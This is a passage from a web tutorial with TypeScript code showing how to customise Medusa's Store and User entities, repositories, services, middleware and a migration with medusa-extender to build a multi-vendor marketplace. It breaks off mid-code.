<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Medusa &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> expressInstance = express();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> Medusa(__dirname + <span class="string">&#x27;/../&#x27;</span>, expressInstance).load([]);</span><br><span class="line"></span><br><span class="line">    expressInstance.listen(<span class="number">9000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.info(<span class="string">&#x27;Server successfully started on port 9000&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bootstrap();</span><br></pre></td></tr></table></figure>



<p>This file will make sure to load all the customizations you’ll add next when you run your Medusa server.</p>
<p>Now, Medusa Extender is fully integrated into your Medusa instance and you can start building the Marketplace.</p>
<h3 id="Customize-the-Store-Entity"><a href="#Customize-the-Store-Entity" class="headerlink" title="Customize the Store Entity"></a>Customize the Store Entity</h3><p>You’ll start by customizing the Store entity. You’ll need to use it later on to add relations between the store entity and the users and products entities.</p>
<p>By convention, customizations using Medusa Extender are organized in a module-like structure. However, this is completely optional.</p>
<p>In the <code>src</code> directory, create the directory <code>modules</code> in which you’ll store all the customizations in.</p>
<p>Then, create the directory <code>store</code> inside the <code>modules</code> directory. The <code>store</code> directory will hold all customizations related to the Store.</p>
<p><strong>Create a Store Entity</strong></p>
<p>Create the file <code>src/modules/store/entities/store.entity.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Store <span class="keyword">as</span> MedusaStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Entity, JoinColumn, OneToMany &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Entity <span class="keyword">as</span> MedusaEntity &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@MedusaEntity(&#123; <span class="attr">override</span>: MedusaStore &#125;)</span><br><span class="line">@Entity()</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Store</span> <span class="keyword">extends</span> <span class="title">MedusaStore</span> </span>&#123;</span><br><span class="line">    <span class="comment">//TODO add relations</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This uses the decorator <code>@Entity</code> from <code>medusa-extender</code> to customize Medusa’s <code>Store</code> entity. You create a <code>Store</code> class that extends Medusa’s Store entity (imported as <code>MedusaStore</code> ).</p>
<p>You’ll, later on, edit this entity to add the relations between the store and users and products.</p>
<p><strong>Create a Store Repository</strong></p>
<p>Next, you need to override Medusa’s <code>StoreRepository</code>. This repository will return Medusa’s <code>Store</code> entity. So, you need to override it to make sure it returns your <code>Store</code> entity that you just created.</p>
<p>Create the file <code>src/modules/store/repositories/store.repository.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; EntityRepository &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StoreRepository <span class="keyword">as</span> MedusaStoreRepository &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/repositories/store&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Repository <span class="keyword">as</span> MedusaRepository, Utils &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Store &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/store.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@MedusaRepository(&#123; <span class="attr">override</span>: MedusaStoreRepository &#125;)</span><br><span class="line">@EntityRepository(Store)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">StoreRepository</span> <span class="keyword">extends</span> <span class="title">Utils</span>.<span class="title">repositoryMixin</span>&lt;<span class="title">Store</span>, <span class="title">MedusaStoreRepository</span>&gt;(<span class="title">MedusaStoreRepository</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>Create the Store Module</strong></p>
<p>For now, these are the only files you’ll add for the store. You can create the Store module using these files.</p>
<p>Create the file <code>src/modules/store/store.module.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Store &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/store.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> StoreRepository <span class="keyword">from</span> <span class="string">&#x27;./repositories/store.repository&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Module(&#123;</span><br><span class="line">    imports: [Store, StoreRepository],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">StoreModule</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>



<p>This uses the <code>@Module</code> decorator from <code>medusa-extender</code> and imports the 2 classes you created.</p>
<p>The last thing left is to import this module and use it with Medusa. In <code>src/main.ts</code> import <code>StoreModule</code> at the beginning of the file:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; StoreModule &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/store/store.module&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>Then, add the <code>StoreModule</code> in the array passed as a parameter to <code>Medusa.load</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> Medusa(__dirname + <span class="string">&#x27;/../&#x27;</span>, expressInstance).load([</span><br><span class="line">    StoreModule</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>



<p>This is all that you’ll do for now in the Store module. In the next sections, you’ll be adding more classes to it as necessary.</p>
<h3 id="Customize-the-User-Entity"><a href="#Customize-the-User-Entity" class="headerlink" title="Customize the User Entity"></a>Customize the User Entity</h3><p>In this section, you’ll customize the user entity mainly to link the user to a store.</p>
<p><strong>Create the User Entity</strong></p>
<p>Create the directory <code>user</code> inside the <code>modules</code> directory and create the file <code>src/modules/user/entities/user.entity.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; User <span class="keyword">as</span> MedusaUser &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Column, Entity, Index, JoinColumn, ManyToOne &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Entity <span class="keyword">as</span> MedusaEntity &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Store &#125; <span class="keyword">from</span> <span class="string">&#x27;../../store/entities/store.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@MedusaEntity(&#123; <span class="attr">override</span>: MedusaUser &#125;)</span><br><span class="line">@Entity()</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">MedusaUser</span> </span>&#123;</span><br><span class="line">    @Index()</span><br><span class="line">    @Column(&#123; <span class="attr">nullable</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">    store_id: string;</span><br><span class="line"></span><br><span class="line">    @ManyToOne(<span class="function">() =&gt;</span> Store, <span class="function">(<span class="params">store</span>) =&gt;</span> store.members)</span><br><span class="line">    @JoinColumn(&#123; <span class="attr">name</span>: <span class="string">&#x27;store_id&#x27;</span> &#125;)</span><br><span class="line">    store: Store;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This class will add an additional column <code>store_id</code> of type string and will add a relation to the <code>Store</code> entity.</p>
<p>To add the new column to the <code>user</code> table in the database, you need to create a Migration file. Create the file <code>src/modules/user/migrations/user.migration.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Migration &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; MigrationInterface, QueryRunner &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Migration()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">addStoreIdToUser1644946220401</span> <span class="title">implements</span> <span class="title">MigrationInterface</span> </span>&#123;</span><br><span class="line">    name = <span class="string">&#x27;addStoreIdToUser1644946220401&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> up(queryRunner: QueryRunner): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> query = <span class="string">`ALTER TABLE public.&quot;user&quot; ADD COLUMN IF NOT EXISTS &quot;store_id&quot; text;`</span>;</span><br><span class="line">      <span class="keyword">await</span> queryRunner.query(query);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> down(queryRunner: QueryRunner): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> query = <span class="string">`ALTER TABLE public.&quot;user&quot; DROP COLUMN &quot;store_id&quot;;`</span>;</span><br><span class="line">      <span class="keyword">await</span> queryRunner.query(query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>The migration is created using the <code>@Migration</code> decorator from <code>medusa-extender</code>. Notice that the migration name should end with a JavaScript timestamp based on <code>typeorm</code>‘s conventions.</p>
<p>The <code>up</code> method is run if the migration hasn’t been run before. It will add the column <code>store_id</code> to the table <code>user</code> if it doesn’t exist.</p>
<p>You’ll also need to add the relation between the Store and the User entities in <code>src/modules/store/entities/store.entity.ts</code> . Replace the <code>//TODO</code> with the following:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@OneToMany(<span class="function">() =&gt;</span> User, <span class="function">(<span class="params">user</span>) =&gt;</span> user.store)</span><br><span class="line">@JoinColumn(&#123; <span class="attr">name</span>: <span class="string">&#x27;id&#x27;</span>, <span class="attr">referencedColumnName</span>: <span class="string">&#x27;store_id&#x27;</span> &#125;)</span><br><span class="line">members: User[];</span><br></pre></td></tr></table></figure>



<p>Make sure to import the <code>User</code> entity at the beginning of the file:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&#x27;../../user/entities/user.entity&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><strong>Create the User Repository</strong></p>
<p>Next, you need to override Medusa’s <code>UserRepository</code>. Create the file <code>src/modules/user/repositories/user.repository.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; UserRepository <span class="keyword">as</span> MedusaUserRepository &#125; <span class="keyword">from</span> <span class="string">&quot;@medusajs/medusa/dist/repositories/user&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Repository <span class="keyword">as</span> MedusaRepository, Utils &#125; <span class="keyword">from</span> <span class="string">&quot;medusa-extender&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; EntityRepository &#125; <span class="keyword">from</span> <span class="string">&quot;typeorm&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&quot;../entities/user.entity&quot;</span>;</span><br><span class="line"></span><br><span class="line">@MedusaRepository(&#123; <span class="attr">override</span>: MedusaUserRepository &#125;)</span><br><span class="line">@EntityRepository(User)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">Utils</span>.<span class="title">repositoryMixin</span>&lt;<span class="title">User</span>, <span class="title">MedusaUserRepository</span>&gt;(<span class="title">MedusaUserRepository</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>Create the User Service</strong></p>
<p>Next, you need to override Medusa’s <code>UserService</code> class. Create the file <code>src/modules/user/services/user.service.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Service &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; EntityManager &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> EventBusService <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/services/event-bus&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; FindConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/types/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; UserService <span class="keyword">as</span> MedusaUserService &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/services&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/user.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> UserRepository <span class="keyword">from</span> <span class="string">&#x27;../repositories/user.repository&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; MedusaError &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-core-utils&#x27;</span>;</span><br><span class="line"></span><br><span class="line">type ConstructorParams = &#123;</span><br><span class="line">    manager: EntityManager;</span><br><span class="line">    userRepository: <span class="keyword">typeof</span> UserRepository;</span><br><span class="line">    eventBusService: EventBusService;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">@Service(&#123; <span class="attr">override</span>: MedusaUserService &#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">UserService</span> <span class="keyword">extends</span> <span class="title">MedusaUserService</span> </span>&#123;</span><br><span class="line">    private readonly manager: EntityManager;</span><br><span class="line">    private readonly userRepository: <span class="keyword">typeof</span> UserRepository;</span><br><span class="line">    private readonly eventBus: EventBusService;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">private readonly container: ConstructorParams</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(container);</span><br><span class="line">        <span class="built_in">this</span>.manager = container.manager;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = container.userRepository;</span><br><span class="line">        <span class="built_in">this</span>.eventBus = container.eventBusService;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> retrieve(userId: string, config?: FindConfig&lt;User&gt;): <span class="built_in">Promise</span>&lt;User&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> userRepo = <span class="built_in">this</span>.manager.getCustomRepository(<span class="built_in">this</span>.userRepository);</span><br><span class="line">        <span class="keyword">const</span> validatedId = <span class="built_in">this</span>.validateId_(userId);</span><br><span class="line">        <span class="keyword">const</span> query = <span class="built_in">this</span>.buildQuery_(&#123; <span class="attr">id</span>: validatedId &#125;, config);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = <span class="keyword">await</span> userRepo.findOne(query);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MedusaError(MedusaError.Types.NOT_FOUND, <span class="string">`User with id: <span class="subst">$&#123;userId&#125;</span> was not found`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user <span class="keyword">as</span> User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This uses the <code>@Service</code> decorator from <code>medusa-extender</code> to override Medusa’s <code>UserService</code>. The class you create to override it will extend <code>UserService</code>.</p>
<p>This new class overrides the <code>retrieve</code> method to ensure that the user returned is the new User entity class you created earlier.</p>
<p><strong>Create a User Middleware</strong></p>
<p>The <code>loggedInUser</code> is not available natively in Medusa. You’ll need to create a Middleware that, when a request is authenticated, registers the logged-in User within the scope.</p>
<p>Create the file <code>src/modules/user/middlewares/loggedInUser.middleware.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; MedusaAuthenticatedRequest, MedusaMiddleware, Middleware &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; NextFunction, Response &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> UserService <span class="keyword">from</span> <span class="string">&#x27;../../user/services/user.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Middleware(&#123; <span class="attr">requireAuth</span>: <span class="literal">true</span>, <span class="attr">routes</span>: [&#123; <span class="attr">method</span>: <span class="string">&quot;all&quot;</span>, <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span> &#125;] &#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">LoggedInUserMiddleware</span> <span class="title">implements</span> <span class="title">MedusaMiddleware</span> </span>&#123;</span><br><span class="line">    public <span class="keyword">async</span> consume(req: MedusaAuthenticatedRequest, <span class="attr">res</span>: Response, <span class="attr">next</span>: NextFunction): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.user &amp;&amp; req.user.userId) &#123;</span><br><span class="line">            <span class="keyword">const</span> userService = req.scope.resolve(<span class="string">&#x27;userService&#x27;</span>) <span class="keyword">as</span> UserService;</span><br><span class="line">            <span class="keyword">const</span> loggedInUser = <span class="keyword">await</span> userService.retrieve(req.user.userId, &#123;</span><br><span class="line">                select: [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;store_id&#x27;</span>],</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            req.scope.register(&#123;</span><br><span class="line">                loggedInUser: &#123;</span><br><span class="line">                    resolve: <span class="function">() =&gt;</span> loggedInUser,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>You can use the <code>@Middleware</code> decorator from <code>medusa-extender</code> to create a Middleware that runs on specific requests. This Middleware is run when the request is received from an authenticated user, and it runs for all paths (notice the use of <code>path: &#39;*&#39;</code> ) and for all types of requests (notice the use of <code>method: &quot;all&quot;</code>).</p>
<p>Inside the middleware, you retrieve the current user ID from the request, then retrieve the user model and register it in the scope so that it can be accessed from services.</p>
<blockquote>
<p>This approach is simplified for the purpose of this tutorial. However, it makes more sense to include this middleware in a separate <code>auth</code> module. Whether you include this middleware in the <code>user</code> module or the <code>auth</code> middleware will not affect its functionality.</p>
</blockquote>
<p><strong>Create a Store Service to Handle User Insert Events</strong></p>
<p>You need to ensure that when a user is created, a store is associated with it. You can do that by listening to the User-created event and creating a new store for that user. You’ll add this event handler in a <code>StoreService</code>.</p>
<p>Create the file <code>src/modules/store/services/store.service.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; StoreService <span class="keyword">as</span> MedusaStoreService &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/services&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; EntityManager &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; CurrencyRepository &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/repositories/currency&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Store &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/store.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; EntityEventType, Service, MedusaEventHandlerParams, OnMedusaEntityEvent &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&#x27;../../user/entities/user.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> EventBusService <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/services/event-bus&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> StoreRepository <span class="keyword">from</span> <span class="string">&#x27;../repositories/store.repository&#x27;</span>;</span><br><span class="line"></span><br><span class="line">interface ConstructorParams &#123;</span><br><span class="line">    loggedInUser: User;</span><br><span class="line">    manager: EntityManager;</span><br><span class="line">    storeRepository: <span class="keyword">typeof</span> StoreRepository;</span><br><span class="line">    currencyRepository: <span class="keyword">typeof</span> CurrencyRepository;</span><br><span class="line">    eventBusService: EventBusService;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Service(&#123; <span class="attr">override</span>: MedusaStoreService, <span class="attr">scope</span>: <span class="string">&#x27;SCOPED&#x27;</span> &#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">StoreService</span> <span class="keyword">extends</span> <span class="title">MedusaStoreService</span> </span>&#123;</span><br><span class="line">    private readonly manager: EntityManager;</span><br><span class="line">    private readonly storeRepository: <span class="keyword">typeof</span> StoreRepository;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">private readonly container: ConstructorParams</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(container);</span><br><span class="line">        <span class="built_in">this</span>.manager = container.manager;</span><br><span class="line">        <span class="built_in">this</span>.storeRepository = container.storeRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    withTransaction(transactionManager: EntityManager): StoreService &#123;</span><br><span class="line">        <span class="keyword">if</span> (!transactionManager) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> cloned = <span class="keyword">new</span> StoreService(&#123;</span><br><span class="line">            ...this.container,</span><br><span class="line">            manager: transactionManager,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        cloned.transactionManager_ = transactionManager;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cloned;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @OnMedusaEntityEvent.Before.Insert(User, &#123; <span class="attr">async</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    public <span class="keyword">async</span> createStoreForNewUser(</span><br><span class="line">        params: MedusaEventHandlerParams&lt;User, <span class="string">&#x27;Insert&#x27;</span>&gt;</span><br><span class="line">    ): <span class="built_in">Promise</span>&lt;EntityEventType&lt;User, <span class="string">&#x27;Insert&#x27;</span>&gt;&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; event &#125; = params;</span><br><span class="line">        <span class="keyword">const</span> createdStore = <span class="keyword">await</span> <span class="built_in">this</span>.withTransaction(event.manager).createForUser(event.entity);</span><br><span class="line">        <span class="keyword">if</span> (!!createdStore) &#123;</span><br><span class="line">            event.entity.store_id = createdStore.id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> event;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> createForUser(user: User): <span class="built_in">Promise</span>&lt;Store | <span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (user.store_id) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> storeRepo = <span class="built_in">this</span>.manager.getCustomRepository(<span class="built_in">this</span>.storeRepository);</span><br><span class="line">        <span class="keyword">const</span> store = storeRepo.create() <span class="keyword">as</span> Store;</span><br><span class="line">        <span class="keyword">return</span> storeRepo.save(store);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> <span class="function"><span class="title">retrieve</span>(<span class="params">relations: string[] = []</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.container.loggedInUser) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.retrieve(relations);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> storeRepo = <span class="built_in">this</span>.manager.getCustomRepository(<span class="built_in">this</span>.storeRepository);</span><br><span class="line">        <span class="keyword">const</span> store = <span class="keyword">await</span> storeRepo.findOne(&#123;</span><br><span class="line">            relations,</span><br><span class="line">            join: &#123; <span class="attr">alias</span>: <span class="string">&#x27;store&#x27;</span>, <span class="attr">innerJoin</span>: &#123; <span class="attr">members</span>: <span class="string">&#x27;store.members&#x27;</span> &#125; &#125;,</span><br><span class="line">            where: <span class="function">(<span class="params">qb</span>) =&gt;</span> &#123;</span><br><span class="line">                qb.where(<span class="string">&#x27;members.id = :memberId&#x27;</span>, &#123; <span class="attr">memberId</span>: <span class="built_in">this</span>.container.loggedInUser.id &#125;);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!store) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Unable to find the user store&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>@OnMedusaEntityEvent.Before.Insert</code> is used to add a listener to an insert event on an entity, which in this case is the <code>User</code> entity. Inside the listener, you create the user using the <code>createForUser</code> method. This method just uses the <code>StoreRepository</code> to create a store.</p>
<p>You also add a helper event <code>retrieve</code> to retrieve the store that belongs to the currently logged-in user.</p>
<p>Notice the use of <code>scope: &#39;SCOPED&#39;</code> in the <code>@Service</code> decorator. This will allow you to access the logged in user you registered earlier in the scope.</p>
<p>You’ll need to import this new class into the <code>StoreModule</code>. In <code>src/modules/store/store.module.ts</code> add the following import at the beginning:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> StoreService <span class="keyword">from</span> <span class="string">&#x27;./services/store.service&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>Then, add the <code>StoreService</code> to the <code>imports</code> array passed to <code>@Module</code> :</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">imports: [Store, StoreRepository, StoreService],</span><br></pre></td></tr></table></figure>



<p><strong>Create a User Subscriber</strong></p>
<p>For the event listener to work, you need to first emit this event in a subscriber. The event will be emitted before a <code>User</code> is inserted. Create the file <code>src/modules/user/subscribers/user.subscriber.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Connection, EntitySubscriberInterface, EventSubscriber, InsertEvent &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; eventEmitter, Utils <span class="keyword">as</span> MedusaUtils, OnMedusaEntityEvent &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/user.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@EventSubscriber()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSubscriber</span> <span class="title">implements</span> <span class="title">EntitySubscriberInterface</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> attachTo(connection: Connection): <span class="keyword">void</span> &#123;</span><br><span class="line">        MedusaUtils.attachOrReplaceEntitySubscriber(connection, UserSubscriber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public listenTo(): <span class="keyword">typeof</span> User &#123;</span><br><span class="line">        <span class="keyword">return</span> User;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> beforeInsert(event: InsertEvent&lt;User&gt;): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> eventEmitter.emitAsync(OnMedusaEntityEvent.Before.InsertEvent(User), &#123;</span><br><span class="line">            event,</span><br><span class="line">            transactionalEntityManager: event.manager,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span 